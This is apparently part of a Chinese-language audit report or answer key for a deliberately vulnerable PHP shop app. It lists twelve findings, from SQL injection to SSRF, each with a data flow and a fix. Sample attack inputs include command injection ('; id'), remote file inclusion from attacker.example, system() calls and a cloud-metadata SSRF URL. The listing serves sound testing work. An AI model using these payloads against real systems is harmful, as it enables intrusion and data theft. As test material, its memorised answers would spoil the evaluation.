## 四、逐项数据流、影响与修复

### 01 · 商品搜索 SQL 注入（SQL 注入 / CWE-89 / high 7.5）
- **位置**：`app/public/catalog/index.php:4`
- **入口**：GET /catalog/index.php?q=
- **数据流**：搜索关键词 $_GET['q'] 未经任何处理直接拼进 LIKE 查询字符串，外部输入可改变 SQL 结构（catalog/index.php:4）。
- **攻击输入**：`?q=' OR '1'='1' -- `（对照正常输入：`?q=手冲壶`）
- **预期差异**：正常输入仅返回匹配商品；注入输入返回全部商品，可进一步 UNION 提取 users 表数据
- **影响**：未认证攻击者可读取不应暴露的业务与用户数据
- **修复**：改用 PDO 预处理语句绑定参数

### 02 · 到店欢迎反射型 XSS（反射型 XSS / CWE-79 / medium 6.1）
- **位置**：`app/public/catalog/greeting.php:3`
- **入口**：GET /catalog/greeting.php?name=
- **数据流**：$_GET['name'] 未经 h() 转义直接拼进 <h2>你好，... 输出，落入 HTML 正文可执行上下文（greeting.php:3）。
- **攻击输入**：`?name=<script>alert(document.cookie)</script>`（对照正常输入：`?name=小明`）
- **预期差异**：正常输入仅显示问候语；攻击输入在受害者浏览器执行脚本
- **影响**：诱导链接可在同源上下文执行脚本、读取页面内容
- **修复**：输出前 htmlspecialchars()（h()）转义

### 03 · 网络诊断命令注入（命令注入 / CWE-78 / high 7.2）
- **位置**：`app/public/ops/ping.php:2`
- **入口**：GET /ops/ping.php?host=
- **数据流**：$_GET['host'] 直接拼进 shell_exec('ping -c 1 -W 1 '.$host)，输入落在 shell 结构位置（ping.php:2）。
- **攻击输入**：`?host=127.0.0.1; id`（对照正常输入：`?host=127.0.0.1`）
- **预期差异**：正常输入返回 ping 输出；注入输入追加执行 id（RCE）
- **影响**：运营/管理员身份可获得 Web 进程权限的命令执行
- **修复**：escapeshellarg() 或免 shell 实现

### 04 · 帮助文档路径遍历读取任意文件（路径遍历与文件读取 / CWE-22 / medium 6.5）
- **位置**：`app/public/support/download.php:3`
- **入口**：GET /support/download.php?file=
- **数据流**：$_GET['file'] 拼进 data_dir().'/docs/' 后直接 file_get_contents，无 realpath 归一化与目录限定（download.php:3）。
- **攻击输入**：`?file=../../vault/internal.txt`（对照正常输入：`?file=shipping.txt`）
- **预期差异**：正常输入返回配送说明；穿越输入返回 vault 内部标记文件内容
- **影响**：登录会员可读取 Web 进程可读的受限文件
- **修复**：realpath() 归一化并校验前缀，或白名单文件名映射

### 05 · 内容中心本地文件包含（本地文件包含 / CWE-98 / medium 5.3）
- **位置**：`app/public/content/page.php:3`
- **入口**：GET /content/page.php?page=
- **数据流**：$_GET['page'] 未经白名单校验即 include APP_ROOT.'/resources/views/'.$name.'.php'，可穿越包含任意路径（page.php:3）。
- **攻击输入**：`?page=../../vault/account`（对照正常输入：`?page=shipping`）
- **预期差异**：正常输入渲染介绍/配送视图；穿越输入执行 vault/account.php（内含 PHP 代码）
- **影响**：未认证攻击者可包含并执行数据目录内 PHP 文件
- **修复**：页面名白名单映射

### 06 · 远程模板预览远程文件包含（远程文件包含 / CWE-98 / high 7.2）
- **位置**：`app/public/ops/template-preview.php:3`
- **入口**：GET /ops/template-preview.php?template=
- **数据流**：$_GET['template'] 未经校验直接 include，且 docker/php.ini 配置 allow_url_include=On，可包含远程 URL（template-preview.php:3）。
- **攻击输入**：`?template=http://attacker.example/evil.php`（对照正常输入：`?template=http://fixtures:8080/templates/season.php`）
- **预期差异**：正常输入加载合作方模板；攻击 URL 执行攻击者服务器上的 PHP 代码
- **影响**：运营/管理员可被诱导或主动触发远程代码执行
- **修复**：关闭 allow_url_include，模板地址白名单

### 07 · 运营公式动态函数调用代码执行（动态函数调用导致代码执行 / CWE-94 / high 7.2）
- **位置**：`app/public/ops/formula.php:3`
- **入口**：GET /ops/formula.php?func=&arg=
- **数据流**：$_GET['func'] 作为可调用函数名直接调用并传入 $_GET['arg']，无函数白名单（formula.php:3）。
- **攻击输入**：`?func=system&arg=id`（对照正常输入：`?func=strtoupper&arg=spring-sale`）
- **预期差异**：正常输入返回大写文本；攻击输入以 system 执行任意命令
- **影响**：运营/管理员可调用任意 PHP 函数直至 RCE
- **修复**：函数名白名单

### 08 · 继续访问开放重定向（开放重定向 / CWE-601 / none 0.0）
- **位置**：`app/public/auth/continue.php:3`
- **入口**：GET /auth/continue.php?next=
- **数据流**：$_GET['next'] 未校验目标是否站内即 header('Location: '.$next)（continue.php:3）。
- **攻击输入**：`?next=https://evil.example`（对照正常输入：`?next=/orders/index.php`）
- **预期差异**：正常输入跳转站内页面；攻击输入跳转外部站点
- **影响**：可被用于钓鱼跳转；按官方口径 CVSS 基础影响为 0，但仍是应检出的真值项
- **修复**：仅允许站内相对路径

### 09 · 数据库诊断异常与堆栈信息泄露（异常及堆栈信息泄露 / CWE-209 / low 2.7）
- **位置**：`app/public/ops/database.php:3`
- **入口**：GET /ops/database.php?probe=
- **数据流**：probe 分支连接失败时把异常类名、getMessage 与完整 TraceAsString 直接输出到页面（database.php:3）。
- **攻击输入**：`?probe=archive`（对照正常输入：`?probe=main`）
- **预期差异**：正常输入显示连接正常；archive 分支回显连接失败细节与堆栈
- **影响**：泄露数据库主机、账号与内部路径等实现细节
- **修复**：对外只返回固定文案，细节仅写日志

### 10 · 使用 MD5 存储密码（使用 MD5 存储密码 / CWE-328 / medium 5.3）
- **位置**：`app/public/auth/register.php:8; app/src/setup.php:17`
- **入口**：POST /auth/register.php
- **数据流**：注册与种子数据均以 md5($password) 无盐写入 password_md5 字段（register.php:8、setup.php:17），登录亦按 md5 比对（login.php:7）。
- **攻击输入**：`注册任意用户后获取库内 md5 值离线破解`（对照正常输入：`—`）
- **预期差异**：无盐 MD5 可被彩虹表/暴力破解还原口令
- **影响**：口令泄露后可离线还原并接管账户
- **修复**：password_hash()/password_verify()

### 11 · 在线留言存储型 XSS（存储型 XSS / CWE-79 / medium 5.4）
- **位置**：`app/public/support/messages.php:5`
- **入口**：POST /support/messages.php
- **数据流**：留言原文入库后在列表页以 $row['message'] 原样输出，未过 h()（messages.php:5），任何浏览留言的用户都会执行。
- **攻击输入**：`message=<script>fetch('/account/me.php')</script>`（对照正常输入：`message=请问可以机洗吗`）
- **预期差异**：正常留言原样显示；攻击留言在其他用户浏览器执行脚本
- **影响**：一个低权限账户即可对所有浏览者发起脚本攻击
- **修复**：输出端统一 h() 转义

### 12 · 链接预览服务端请求伪造（服务端请求伪造（SSRF） / CWE-918 / medium 4.9）
- **位置**：`app/public/ops/url-preview.php:3`
- **入口**：GET /ops/url-preview.php?url=
- **数据流**：$_GET['url'] 未经协议/目标校验即 file_get_contents($url)，可指向内网地址（url-preview.php:3）。
- **攻击输入**：`?url=http://169.254.169.254/latest/meta-data/`（对照正常输入：`?url=http://fixtures:8080/catalog-info`）
- **预期差异**：正常输入返回外部文本预览；攻击输入返回内网/云元数据内容
- **影响**：运营/管理员可探测内网并读取元数据等敏感接口
